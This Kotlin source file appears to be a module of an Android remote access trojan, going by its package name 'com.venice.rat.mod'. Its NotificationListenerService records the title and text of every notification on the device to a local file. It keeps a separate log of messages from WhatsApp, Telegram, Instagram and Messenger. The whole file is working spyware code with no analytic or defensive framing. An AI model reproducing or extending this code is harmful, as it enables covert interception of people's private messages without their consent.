package com.venice.rat.mod

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class NotifSvc : NotificationListenerService() {
    private val fmt = SimpleDateFormat("dd/MM HH:mm", Locale.US)

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        runCatching {
            val pkg = sbn.packageName
            val ex = sbn.notification.extras
            val title = ex.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
            val text = ex.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
            val big = ex.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString().orEmpty()
            val body = (if (big.isNotBlank()) big else text).replace("\n", " ")
            if (title.isBlank() && body.isBlank()) return
            val line = "${fmt.format(Date())} | $pkg | ${title.take(40)}: ${body.take(200)}"
            File(filesDir, "notif.txt").appendText(line + "\n")
            if (pkg.contains("whatsapp") || pkg.contains("telegram") ||
                pkg.contains("instagram") || pkg.contains("messenger")) {
                File(filesDir, "wa.txt").appendText(line + "\n")
            }
        }
    }
}
